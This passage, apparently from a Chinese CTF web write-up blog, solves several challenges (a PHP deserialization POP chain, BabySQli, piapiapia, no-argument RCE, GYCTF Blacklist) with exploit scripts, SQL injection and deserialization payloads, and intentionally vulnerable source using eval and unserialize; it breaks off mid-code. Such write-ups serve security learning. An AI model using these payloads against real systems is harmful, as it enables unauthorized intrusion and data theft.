class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">FileHandler</span> </span>&#123;<br><br>    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-variable\">$op</span>;<br>    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-variable\">$filename</span>;<br>    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-variable\">$content</span>;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$op</span> = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>        <span class=\"hljs-variable\">$filename</span> = <span class=\"hljs-string\">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class=\"hljs-variable\">$content</span> = <span class=\"hljs-string\">&quot;Hello World!&quot;</span>;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;process();<br>    &#125;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">process</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;1&quot;</span>) &#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;write();<br>        &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;2&quot;</span>) &#123;<br>            <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-keyword\">$this</span>-&gt;read();<br>            <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-variable\">$res</span>);<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">write</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;filename) &amp;&amp; <span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;content)) &#123;<br>            <span class=\"hljs-keyword\">if</span>(strlen((<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-keyword\">$this</span>-&gt;content) &gt; <span class=\"hljs-number\">100</span>) &#123;<br>                <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Too long!&quot;</span>);<br>                <span class=\"hljs-keyword\">die</span>();<br>            &#125;<br>            <span class=\"hljs-variable\">$res</span> = file_put_contents(<span class=\"hljs-keyword\">$this</span>-&gt;filename, <span class=\"hljs-keyword\">$this</span>-&gt;content);<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$res</span>) <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Successful!&quot;</span>);<br>            <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Failed!&quot;</span>);<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">read</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-string\">&quot;&quot;</span>;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;filename)) &#123;<br>            <span class=\"hljs-variable\">$res</span> = file_get_contents(<span class=\"hljs-keyword\">$this</span>-&gt;filename);<br>        &#125;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$res</span>;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">output</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$s</span></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$s</span>;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;op === <span class=\"hljs-string\">&quot;2&quot;</span>)<br>            <span class=\"hljs-keyword\">$this</span>-&gt;op = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;content = <span class=\"hljs-string\">&quot;&quot;</span>;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;process();<br>    &#125;<br><br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">is_valid</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$s</span></span>) </span>&#123;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$i</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$i</span> &lt; strlen(<span class=\"hljs-variable\">$s</span>); <span class=\"hljs-variable\">$i</span>++)<br>        <span class=\"hljs-keyword\">if</span>(!(ord(<span class=\"hljs-variable\">$s</span>[<span class=\"hljs-variable\">$i</span>]) &gt;= <span class=\"hljs-number\">32</span> &amp;&amp; ord(<span class=\"hljs-variable\">$s</span>[<span class=\"hljs-variable\">$i</span>]) &lt;= <span class=\"hljs-number\">125</span>))<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">true</span>;<br>&#125;<br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>&#123;<span class=\"hljs-string\">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class=\"hljs-variable\">$str</span> = (<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;str&#x27;</span>];<br>    <span class=\"hljs-keyword\">if</span>(is_valid(<span class=\"hljs-variable\">$str</span>)) &#123;<br>        <span class=\"hljs-variable\">$obj</span> = unserialize(<span class=\"hljs-variable\">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure></li>\n<li><p>反序列化的题目，寻找POP链</p>\n</li>\n<li><p>read()可以读文件=&gt;read()会被process()调用=&gt;process()会被<code>__construct()</code>还有<code>__destruct()</code>调用</p>\n</li>\n<li><p>由于<code>__construct()</code>会初始化导致文件名不可控，且其可以绕过，而<code>__destruct()</code>,会让op强制等于1，但是这里用了<code>===‘2’</code>，也就是说如果op为整型2，即可绕过</p>\n</li>\n<li><p>同时这题有一个check，我们把protected改成public即可绕过</p>\n</li>\n<li><p>exp：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-keyword\">include</span>(<span class=\"hljs-string\">&quot;flag.php&quot;</span>);<br><br>highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">FileHandler</span> </span>&#123;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$op</span>=<span class=\"hljs-number\">2</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$filename</span>=<span class=\"hljs-string\">&#x27;flag.php&#x27;</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$content</span>;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$op</span> = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>        <span class=\"hljs-variable\">$filename</span> = <span class=\"hljs-string\">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class=\"hljs-variable\">$content</span> = <span class=\"hljs-string\">&quot;Hello World!&quot;</span>;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;process();<br>    &#125;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">process</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;1&quot;</span>) &#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;write();<br>        &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;2&quot;</span>) &#123;<br>            <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-keyword\">$this</span>-&gt;read();<br>            <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-variable\">$res</span>);<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">write</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;filename) &amp;&amp; <span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;content)) &#123;<br>            <span class=\"hljs-keyword\">if</span>(strlen((<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-keyword\">$this</span>-&gt;content) &gt; <span class=\"hljs-number\">100</span>) &#123;<br>                <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Too long!&quot;</span>);<br>                <span class=\"hljs-keyword\">die</span>();<br>            &#125;<br>            <span class=\"hljs-variable\">$res</span> = file_put_contents(<span class=\"hljs-keyword\">$this</span>-&gt;filename, <span class=\"hljs-keyword\">$this</span>-&gt;content);<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$res</span>) <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Successful!&quot;</span>);<br>            <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Failed!&quot;</span>);<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;output(<span class=\"hljs-string\">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">read</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-string\">&quot;&quot;</span>;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;filename)) &#123;<br>            <span class=\"hljs-variable\">$res</span> = file_get_contents(<span class=\"hljs-keyword\">$this</span>-&gt;filename);<br>        &#125;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$res</span>;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">output</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$s</span></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$s</span>;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;op === <span class=\"hljs-string\">&quot;2&quot;</span>)<br>            <span class=\"hljs-keyword\">$this</span>-&gt;op = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;content = <span class=\"hljs-string\">&quot;&quot;</span>;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;process();<br>    &#125;<br><br>&#125;<br><br><span class=\"hljs-variable\">$a</span> = <span class=\"hljs-keyword\">new</span> FileHandler;<br>var_dump(urlencode(serialize(<span class=\"hljs-variable\">$a</span>)));<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"GXYCTF2019-BabySQli\"><a href=\"#GXYCTF2019-BabySQli\" class=\"headerlink\" title=\"[GXYCTF2019]BabySQli\"></a>[GXYCTF2019]BabySQli</h2><ol>\n<li>测试单引号会报错</li>\n<li>union select 字段数为3，但是没有回显点，可能是盲注或者报错注入</li>\n<li>user为admin时报wrong pass，user为其它时报wrong user，这里可能是盲注点</li>\n<li> 有一段编码，base32+base64解码得到：<code>select * from user where username = &#39;$name&#39;</code></li>\n<li>题目过滤了一些字符：<code>(    )   or    =</code></li>\n<li>要通过注入拿到数据基本是不可行的，这里看到sql语句中只有查询name值，没有看到password，可能判断是否登入的语句是<code>(select * from user where username = &#39;$name&#39;)[&#39;password&#39;] =md5(password) </code></li>\n<li>此时构造payload:<code>name=-1&#39; union select 1,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;#&amp;pw=123456</code>即可登陆成功拿到flag</li>\n</ol>\n<h2 id=\"0CTF-2016-piapiapia\"><a href=\"#0CTF-2016-piapiapia\" class=\"headerlink\" title=\"[0CTF 2016]piapiapia\"></a>[0CTF 2016]piapiapia</h2><ol>\n<li>/<a href=\"http://www.zip拿到源码/\">www.zip拿到源码</a></li>\n<li>看源码应该是反序列化的题目，同时看到<code>return preg_replace($safe, &#39;hacker&#39;, $string);</code>，应该是字符逃逸反序列化的题目。同时flag应该在config.php中</li>\n<li>先构造POP链</li>\n<li>profile.php可以读文件，要实现任意文件读取就要覆盖$profile[‘photo’]，而$profile[‘photo’]在update.php中控制。接下来就是要如何把$profile[‘photo’]变成config.php</li>\n<li>update.php可传入四个参数，其中phone和email被正则匹配限制，而nickname是用strlen限制在10以内，把nickname改成数组也就绕过了长度限制</li>\n<li>我们需要构造<code>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;s:9:&quot;lalalalla&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>，利用where会被替换成hacker，构造payload：<code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></li>\n<li>要注意这边构造时，需要把nickname构造成数组</li>\n</ol>\n<h2 id=\"GXYCTF2019-禁止套娃\"><a href=\"#GXYCTF2019-禁止套娃\" class=\"headerlink\" title=\"[GXYCTF2019]禁止套娃\"></a>[GXYCTF2019]禁止套娃</h2><ol>\n<li><p>测试发现有/.git/用githack跑一下，但是我没拿到源码？？</p>\n</li>\n<li><p>网上找到源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&quot;flag.php&quot;</span>;<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;flag在哪里呢？ &lt;br&gt;&quot;</span>;<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;exp&#x27;</span>]))&#123;<br>    <span class=\"hljs-keyword\">if</span> (!preg_match(<span class=\"hljs-string\">&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;exp&#x27;</span>])) &#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-string\">&#x27;;&#x27;</span> === preg_replace(<span class=\"hljs-string\">&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;</span>, <span class=\"hljs-literal\">NULL</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;exp&#x27;</span>])) &#123;<br>            <span class=\"hljs-keyword\">if</span> (!preg_match(<span class=\"hljs-string\">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;exp&#x27;</span>])) &#123;<br>                <span class=\"hljs-comment\">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span>&#123;<br>                <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span>&#123;<br>            <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span>&#123;<br>        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class=\"hljs-comment\">// highlight_file(__FILE__);</span><br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure></li>\n<li><p>无参数RCE（<a href=\"https://xz.aliyun.com/t/6316%EF%BC%89\">https://xz.aliyun.com/t/6316）</a></p>\n</li>\n<li><p>一些常见函数：</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\"><span class=\"hljs-function\"><span class=\"hljs-title\">getchwd</span><span class=\"hljs-params\">()</span></span> 函数返回当前工作目录。<br><span class=\"hljs-function\"><span class=\"hljs-title\">scandir</span><span class=\"hljs-params\">()</span></span> 函数返回指定目录中的文件和目录的数组。<br><span class=\"hljs-function\"><span class=\"hljs-title\">dirname</span><span class=\"hljs-params\">()</span></span> 函数返回路径中的目录部分。<br><span class=\"hljs-function\"><span class=\"hljs-title\">chdir</span><span class=\"hljs-params\">()</span></span> 函数改变当前的目录。<br><br><span class=\"hljs-function\"><span class=\"hljs-title\">readfile</span><span class=\"hljs-params\">()</span></span>  输出一个文件<br><br><span class=\"hljs-function\"><span class=\"hljs-title\">current</span><span class=\"hljs-params\">()</span></span>       返回数组中的当前单元, 默认取第一个值<br><span class=\"hljs-function\"><span class=\"hljs-title\">pos</span><span class=\"hljs-params\">()</span></span>           current() 的别名<br><span class=\"hljs-function\"><span class=\"hljs-title\">next</span><span class=\"hljs-params\">()</span></span> 函数将内部指针指向数组中的下一个元素，并输出。<br><span class=\"hljs-function\"><span class=\"hljs-title\">end</span><span class=\"hljs-params\">()</span></span>       将内部指针指向数组中的最后一个元素，并输出。<br><span class=\"hljs-function\"><span class=\"hljs-title\">array_rand</span><span class=\"hljs-params\">()</span></span>    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。<br><span class=\"hljs-function\"><span class=\"hljs-title\">array_flip</span><span class=\"hljs-params\">()</span></span>    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。<br><br><span class=\"hljs-function\"><span class=\"hljs-title\">chr</span><span class=\"hljs-params\">()</span></span> 函数从指定的 ASCII 值返回字符。<br>hex2bin — 转换十六进制字符串为二进制字符串<br><br><span class=\"hljs-function\"><span class=\"hljs-title\">getenv</span><span class=\"hljs-params\">()</span></span>        获取一个环境变量的值(在<span class=\"hljs-number\">7.1</span>之后可以不给予参数)<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"GYCTF2020-Blacklist\"><a href=\"#GYCTF2020-Blacklist\" class=\"headerlink\" title=\"[GYCTF2020]Blacklist\"></a>[GYCTF2020]Blacklist</h2><ol>\n<li><p>preg_match(“/set|prepare|alter|rename|select|update|delete|drop|insert|where|./i”,$inject);</p>\n</li>\n<li><p>第一眼看题目像强网杯随便注，同样测试堆叠注入</p>\n</li>\n<li><p><code>1&#39;;show tables;</code>=&gt;</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\"><span class=\"hljs-function\"><span class=\"hljs-title\">array</span><span class=\"hljs-params\">(<span class=\"hljs-number\">1</span>)</span></span> &#123;<br>  <span class=\"hljs-selector-attr\">[0]</span>=&gt;<br>  string(<span class=\"hljs-number\">8</span>) <span class=\"hljs-string\">&quot;FlagHere&quot;</span><br>&#125;<br><span class=\"hljs-function\"><span class=\"hljs-title\">array</span><span class=\"hljs-params\">(<span class=\"hljs-number\">1</span>)</span></span> &#123;<br>  <span class=\"hljs-selector-attr\">[0]</span>=&gt;<br>  string(<span class=\"hljs-number\">5</span>) <span class=\"hljs-string\">&quot;words&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure></li>\n<li><p><code>1&#39;;show columns from FlagHere;</code>=&gt;</p>\n<figure class=\"highlight sml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sml\"><span class=\"hljs-built_in\">array</span>(<span class=\"hljs-number\">6</span>) &#123;<br>  [<span class=\"hljs-number\">0</span>]=&gt;<br>  <span class=\"hljs-built_in\">string</span>(<span class=\"hljs-number\">4</span>) <span class=\"hljs-string\">&quot;flag&quot;</span><br>  [<span class=\"hljs-number\">1</span>]=&gt;<br>  <span class=\"hljs-built_in\">string</span>(<span class=\"hljs-number\">12</span>) <span class=\"hljs-string\">&quot;varchar(100)&quot;</span><br>  [<span class=\"hljs-number\">2</span>]=&gt;<br>  <span class=\"hljs-built_in\">string</span>(<span class=\"hljs-number\">2</span>) <span class=\"hljs-string\">&quot;NO&quot;</span><br>  [<span class=\"hljs-number\">3</span>]=&gt;<br>  <span class=\"hljs-built_in\">string</span>(<span class=\"hljs-number\">0</span>) <span class=\"hljs-string\">&quot;&quot;</span><br>  [<span class=\"hljs-number\">4</span>]=&gt;<br>  <span class=\"hljs-type\">NULL</span><br>  [<span class=\"hljs-number\">5</span>]=&gt;<br>  <span class=\"hljs-built_in\">string</span>(<span class=\"hljs-number\">0</span>) <span class=\"hljs-string\">&quot;&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure></li>\n<li><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p>\n<p><code>1&#39;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;</code></p>\n</li>\n</ol>\n<h2 id=\"SUCTF-2019-Pythonginx\"><a href=\"#SUCTF-2019-Pythonginx\" class=\"headerlink\" title=\"[SUCTF 2019]Pythonginx\"></a>[SUCTF 2019]Pythonginx</h2><ol>\n<li><p>源码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">def getUrl():<br>    url = request.args.<span class=\"hljs-built_in\">get</span>(<span class=\"hljs-string\">&quot;url&quot;</span>)<br>    host = parse.<span class=\"hljs-built_in\">urlparse</span>(url).hostname<br>    if host == <span class=\"hljs-string\">&#x27;suctf.cc&#x27;</span>:<br>        return <span class=\"hljs-string\">&quot;我扌 your problem? 111&quot;</span><br>    parts = <span class=\"hljs-built_in\">list</span>(<span class=\"hljs-built_in\">urlsplit</span>(url))<br>    host = parts[<span class=\"hljs-number\">1</span>]<br>    if host == <span class=\"hljs-string\">&#x27;suctf.cc&#x27;</span>:<br>        return <span class=\"hljs-string\">&quot;我扌 your problem? 222 &quot;</span> + host<br>    newhost = []<br>    for h in host.<span class=\"hljs-built_in\">split</span>(<span class=\"hljs-string\">&#x27;.&#x27;</span>):<br>        newhost.<span class=\"hljs-built_in\">append</span>(h.<span class=\"hljs-built_in\">encode</span>(<span class=\"hljs-string\">&#x27;idna&#x27;</span>).<span class=\"hljs-built_in\">decode</span>(<span class=\"hljs-string\">&#x27;utf-8&#x27;</span>))<br>    parts[<span 